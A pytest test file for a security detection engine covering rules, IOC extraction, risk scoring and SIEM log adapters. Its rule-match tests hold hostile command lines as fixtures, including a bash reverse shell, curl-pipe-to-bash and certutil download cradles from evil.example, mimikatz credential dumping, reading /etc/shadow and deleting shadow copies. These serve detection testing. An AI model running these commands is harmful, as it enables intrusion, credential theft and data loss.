"""Rules, IOC extraction, fingerprints, risk scoring, SIEM adapters."""

from __future__ import annotations

import pytest

from app.detection import compute_risk_score, event_fingerprint, extract_iocs, get_engine
from app.detection.engine import RuleEngine, RuleError, load_rules, summarize
from app.ingest import AdapterError, parse_payload


def ev(**kw):
    base = {"title": "t", "event_type": "generic.event", "raw_data": {}}
    base.update(kw)
    return base


def ids(event):
    return [h.rule_id for h in get_engine().evaluate(event)]


# ----------------------------------------------------------------- rules ----
def test_all_builtin_rules_load_and_are_well_formed():
    rules = load_rules()
    assert len(rules) >= 35
    assert len({r.id for r in rules}) == len(rules)
    for r in rules:
        assert r.techniques and r.tactics, r.id
        assert all(t.startswith("TA") for t in r.tactics) and all(t.startswith("T") for t in r.techniques)


@pytest.mark.parametrize(
    "event,expected",
    [
        (ev(event_type="authentication.brute_force"), "TB-AUTH-001"),
        (ev(event_type="authentication.brute_force_success"), "TB-AUTH-002"),
        (ev(event_type="authentication.password_spraying"), "TB-AUTH-003"),
        (ev(event_type="web.log4shell"), "TB-WEB-002"),
        (ev(event_type="recon.scanner"), "TB-RECON-001"),
        (ev(command_line="powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"), "TB-EXEC-001"),
        (ev(command_line="powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""), "TB-EXEC-002"),
        (ev(command_line="bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"), "TB-EXEC-003"),
        (ev(command_line="curl -s http://evil.example/x.sh | bash"), "TB-EXEC-004"),
        (ev(command_line="certutil.exe -urlcache -f http://evil.example/a.exe a.exe"), "TB-EXEC-005"),
        (ev(command_line="mimikatz.exe sekurlsa::logonpasswords"), "TB-CRED-001"),
        (ev(command_line="cat /etc/shadow"), "TB-CRED-002"),
        (ev(command_line="wevtutil cl Security"), "TB-EVADE-001"),
        (ev(command_line="vssadmin delete shadows /all /quiet"), "TB-IMPACT-001"),
        (ev(command_line="useradd -m backdoor"), "TB-PERSIST-001"),
        (ev(command_line="schtasks /create /tn x /tr evil.exe"), "TB-PERSIST-002"),
        (ev(raw_data={"bytes_out": 900_000_000}), "TB-EXFIL-001"),
        (ev(raw_data={"eventName": "StopLogging"}), "TB-CLOUD-002"),
        (ev(raw_data={"eventName": "AttachUserPolicy"}), "TB-CLOUD-003"),
        (ev(raw_data={"userIdentity": {"type": "Root"}}), "TB-CLOUD-004"),
        (ev(raw_data={"eventName": "ConsoleLogin", "additionalEventData": {"MFAUsed": "No"}}), "TB-CLOUD-005"),
        (ev(event_type="network.firewall.allow", destination_port=3389), "TB-LAT-001"),
    ],
)
def test_rule_matches(event, expected):
    assert expected in ids(event)


@pytest.mark.parametrize(
    "event",
    [
        ev(event_type="authentication.success", username="root"),  # root login is not cloud-root usage
        ev(command_line="ls -la /var/log"),
        ev(command_line="curl -s https://api.example.com/health"),
        ev(command_line="powershell Get-Process"),
        ev(title="Scheduled backup finished", description="vss snapshot created successfully"),
        ev(event_type="network.firewall.allow", destination_port=443),
        ev(raw_data={"bytes_out": 1200}),
        ev(raw_data={"eventName": "ConsoleLogin", "additionalEventData": {"MFAUsed": "Yes"}}),
    ],
)
def test_benign_events_do_not_match(event):
    assert ids(event) == []


def test_hits_sorted_by_severity_and_summarised():
    hits = get_engine().evaluate(ev(event_type="web.log4shell", command_line="vssadmin delete shadows"))
    assert hits[0].severity == "critical"
    s = summarize(hits)
    assert s["severity_floor"] == "critical" and "T1190" in s["techniques"] and s["rules"]
    assert summarize([])["matched"] is False


def test_text_pseudo_field_searches_raw_data_recursively():
    assert "TB-CRED-001" in ids(ev(raw_data={"nested": {"deep": ["x", "ran mimikatz here"]}}))


def test_regex_work_is_bounded_on_huge_input():
    import time
    t = time.perf_counter()
    get_engine().evaluate(ev(command_line="A" * 500_000 + " powershell -enc " + "A" * 100))
    assert time.perf_counter() - t < 2


def test_malformed_rule_files_are_rejected(tmp_path):
    p = tmp_path / "r.yaml"
    p.write_text("- {id: X, name: n, severity: loud, match: {field: a, equals: b}}")
    with pytest.raises(RuleError):
        load_rules(p)
    p.write_text("- {id: X, name: n, severity: low, match: {field: a, regex: '('}}")
    with pytest.raises(RuleError):
        load_rules(p)
    p.write_text("- {id: X, name: n, severity: low, match: {field: a}}")
    with pytest.raises(RuleError):
        load_rules(p)


def test_a_crashing_rule_does_not_break_evaluation():
    good = load_rules()[0]
    from dataclasses import replace
    bad = replace(good, id="BAD", match={"field": "x", "gt": "not-a-number-but-fine"})
    engine = RuleEngine([bad, good])
    assert isinstance(engine.evaluate(ev(event_type="authentication.brute_force")), list)


# ------------------------------------------------------- iocs / risk / fp ----
def test_ioc_extraction():
    text = "conn from 203.0.113.9 and 10.0.0.5 and 999.1.1.1 to evil.example.com via http://evil.example.com/a.sh sha256 " + "a" * 64
    f = extract_iocs(text)
    assert "203.0.113.9" in f["ips"] and "999.1.1.1" not in f["ips"]
    assert "evil.example.com" in f["domains"] and f["urls"] and f["hashes"] == ["a" * 64]
    assert extract_iocs("payload.exe and run.sh") ["domains"] == []


def test_fingerprint_stable_and_discriminating():
    a = {"event_type": "authentication.brute_force", "source_ip": "1.2.3.4", "username": "root", "title": "12 failures"}
    b = {**a, "title": "15 failures"}
    assert event_fingerprint(a, ["R1"]) == event_fingerprint(b, ["R1"])
    assert event_fingerprint(a, ["R1"]) != event_fingerprint({**a, "source_ip": "1.2.3.5"}, ["R1"])
    assert event_fingerprint(a, ["R1"]) != event_fingerprint({**a, "username": "admin"}, ["R1"])
    no_ip_a = {"event_type": "x", "title": "12 odd things"}
    assert event_fingerprint(no_ip_a) == event_fingerprint({"event_type": "x", "title": "15 odd things"})


def test_risk_score_is_monotonic_and_bounded():
    low, _ = compute_risk_score(severity="low", confidence=50)
    high, _ = compute_risk_score(severity="high", confidence=90)
    crit_cj, parts = compute_risk_score(severity="critical", confidence=100, asset_criticality="crown_jewel", intel_score=100, rule_hit_count=5)
    assert 0 <= low < high < crit_cj <= 100
    assert parts["asset_multiplier"] == 1.3
    assert compute_risk_score(severity="high", confidence=80, intel_score=0)[0] < compute_risk_score(severity="high", confidence=80, intel_score=100)[0]


# ---------------------------------------------------------------- adapters ----
def test_wazuh_adapter():
    w = {"timestamp": "2026-10-01T10:00:00.000+0000",
         "rule": {"id": "5710", "level": 10, "description": "sshd: non-existent user", "groups": ["sshd", "authentication_failed"]},
         "agent": {"name": "web-01"}, "data": {"srcip": "203.0.113.9", "dstuser": "admin"}, "full_log": "Failed password"}
    e = parse_payload("wazuh", w)[0]
    assert (e.source_ip, e.username, e.asset_name, e.event_type) == ("203.0.113.9", "admin", "web-01", "authentication.failed")
    assert e.occurred_at.year == 2026 and e.raw_data["severity_hint"] == "high"


def test_ecs_adapter():
    d = {"@timestamp": "2026-10-01T10:00:00Z", "event": {"category": ["process"], "action": "start", "severity": 80},
         "host": {"name": "ws-7"}, "process": {"name": "powershell.exe", "command_line": "powershell -enc AAAA"},
         "source": {"ip": "198.51.100.3", "port": 4444}, "user": {"name": "bob"}}
    e = parse_payload("ecs", [d])[0]
    assert e.command_line.startswith("powershell") and e.source_port == 4444 and e.raw_data["severity_hint"] == "high"


def test_cef_adapter_and_errors():
    line = "CEF:0|Fortinet|FortiGate|7.0|100|Port scan|8|src=198.51.100.7 dst=10.0.0.5 dpt=22 suser=bob msg=Scan detected"
    e = parse_payload("cef", line)[0]
    assert (e.source_ip, e.destination_port, e.username) == ("198.51.100.7", 22, "bob")
    with pytest.raises(AdapterError):
        parse_payload("cef", "not a cef line")


def test_cloudtrail_adapter_skips_read_only_noise():
    recs = {"Records": [
        {"eventName": "ListBuckets", "eventSource": "s3.amazonaws.com"},
        {"eventName": "DeleteTrail", "eventSource": "cloudtrail.amazonaws.com", "sourceIPAddress": "198.51.100.1",
         "userIdentity": {"type": "IAMUser", "userName": "eve"}, "eventTime": "2026-10-01T10:00:00Z"},
        {"eventName": "GetSecretValue", "errorCode": "AccessDenied", "eventSource": "secretsmanager.amazonaws.com",
         "sourceIPAddress": "not-an-ip"},
    ]}
    events = parse_payload("cloudtrail", recs)
    assert len(events) == 2 and events[0].source_ip == "198.51.100.1" and events[1].source_ip is None
    assert "TB-CLOUD-002" in ids(events[0].model_dump())


def test_splunk_adapter():
    e = parse_payload("splunk", {"time": 1790000000, "host": "fw1", "sourcetype": "pan:threat",
                                 "event": {"signature": "Brute force", "src_ip": "198.51.100.9", "dest_port": "22", "user": "root"}})[0]
    assert e.title == "Brute force" and e.destination_port == 22 and e.asset_name == "fw1"


def test_adapter_limits_and_unknown_format():
    with pytest.raises(AdapterError):
        parse_payload("nope", {})
    with pytest.raises(AdapterError):
        parse_payload("splunk", [{"event": {"signature": "x"}}] * 60, max_events=50)


def test_webhook_endpoint_queues_each_event(client, auth, db):
    import time
    body = {"Records": [
        {"eventName": "StopLogging", "eventSource": "cloudtrail.amazonaws.com", "sourceIPAddress": "198.51.100.1",
         "userIdentity": {"type": "IAMUser", "userName": "eve"}},
    ]}
    r = client.post("/api/v1/ingest/webhook/cloudtrail", json=body, headers=auth("analyst_a"))
    assert r.status_code == 202 and r.json()["accepted"] == 1
    run_id = r.json()["runs"][0]["run_id"]
    for _ in range(100):
        got = client.get(f"/api/v1/orchestrator/runs/{run_id}", headers=auth("analyst_a")).json()
        if got["status"] in ("completed", "failed"):
            break
        time.sleep(0.05)
    assert got["status"] == "completed" and got["source"] == "webhook:cloudtrail"
    assert db.rows("threats")[0]["rule_hits"][0]["rule_id"] == "TB-CLOUD-002"


def test_webhook_rejects_bad_input(client, auth):
    h = auth("analyst_a")
    assert client.post("/api/v1/ingest/webhook/unknown", json={}, headers=h).status_code == 404
    assert client.post("/api/v1/ingest/webhook/cef", content="garbage", headers=h).status_code == 422
    huge = {"x": "A" * 1_100_000}
    assert client.post("/api/v1/ingest/webhook/generic", json=huge, headers=h).status_code == 413
    assert client.post("/api/v1/ingest/webhook/cef", content="x", headers={}).status_code == 401


@pytest.mark.parametrize(
    "payload",
    [
        "tar " + "a " * 9000,
        "powershell " + "-e " * 6000,
        "net user " + "x " * 9000,
        "A" * 19000 + "!",
        "(" * 9000 + "vssadmin " * 100,
        "curl " + "x|" * 9000,
        "mimikatz " * 2000,
        "reg save hklm\\ " * 1200,
        "bash -i " + ">" * 18000,
    ],
)
def test_adversarial_inputs_cannot_cause_regex_blowup(payload):
    import time
    start = time.perf_counter()
    get_engine().evaluate(ev(command_line=payload, title=payload[:200], raw_data={"x": payload}))
    assert time.perf_counter() - start < 1.5, "a rule has super-linear backtracking"
